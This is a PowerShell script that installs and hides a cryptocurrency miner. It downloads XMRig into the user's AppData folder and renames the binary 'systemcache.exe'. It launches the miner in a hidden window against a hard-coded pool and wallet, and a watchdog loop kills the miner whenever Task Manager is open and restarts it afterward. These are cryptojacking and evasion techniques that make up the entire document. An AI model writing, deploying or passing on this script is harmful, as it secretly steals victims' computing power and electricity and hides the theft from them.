# ================================
# StartMining.ps1 - Full Miner Installer and Watchdog
# ================================
$AppData = $env:APPDATA
$MinerDir = "$AppData\XMRigMiner"
$MinerVersion = "6.21.0"
$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v$MinerVersion/xmrig-$MinerVersion-msvc-win64.zip"
$ZipPath = "$MinerDir\xmrig.zip"
$ExtractPath = "$MinerDir\extract"
$ExeName = "systemcache.exe"
$MinerPath = "$MinerDir\xmrig-$MinerVersion\$ExeName"
$Wallet = "BTC:1H8fueovMvcQLArhxw7P4QZ3FAfhEZg7CB.worker1"
$Pool = "159.203.162.18:3333"
$Password = "x"
$LogFile = "$MinerDir\miner.log"

# Create miner folder
if (!(Test-Path $MinerDir)) {
    New-Item -ItemType Directory -Path $MinerDir | Out-Null
}

# Download XMRig
if (!(Test-Path $MinerPath)) {
    Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath

    Expand-Archive -LiteralPath $ZipPath -DestinationPath $ExtractPath

    $XmrigOriginal = Get-ChildItem "$ExtractPath\xmrig-$MinerVersion\xmrig.exe" -Force | Select-Object -ExpandProperty FullName
    $TargetDir = "$MinerDir\xmrig-$MinerVersion"
    if (Test-Path $TargetDir) { Remove-Item $TargetDir -Recurse -Force }
    Move-Item "$ExtractPath\xmrig-$MinerVersion" $TargetDir

    Rename-Item "$TargetDir\xmrig.exe" $ExeName
    Remove-Item $ZipPath -Force
    Remove-Item $ExtractPath -Recurse -Force
}

# GPU detection
$gpuArgs = ""
$gpus = Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name
foreach ($gpu in $gpus) {
    if ($gpu -like "*nvidia*") { $gpuArgs = "--cuda --cuda-launch=16x1" }
    elseif ($gpu -like "*amd*" -or $gpu -like "*radeon*") { $gpuArgs = "--opencl --opencl-threads=1 --opencl-launch=64x1" }
}

# Build arguments
$arguments = "--algo randomx --url $Pool --user $Wallet --pass $Password --randomx-no-numa --randomx-mode=light --no-huge-pages --threads=1 --cpu-priority=0 --donate-level=1 --no-color --log-file `"$LogFile`" --api-port 0 $gpuArgs"

# Watchdog loop
while ($true) {
    $isTaskmgr = Get-Process | Where-Object { $_.Name -eq "Taskmgr" }
    $isMiner = Get-Process | Where-Object { $_.Name -eq "systemcache" }

    if ($isTaskmgr) {
        if ($isMiner) {
            Stop-Process -Name "systemcache" -Force
        }
    } else {
        if (-not $isMiner) {
            Start-Process -FilePath $MinerPath -ArgumentList $arguments -WindowStyle Hidden
        }
    }

    Start-Sleep -Seconds 10
}
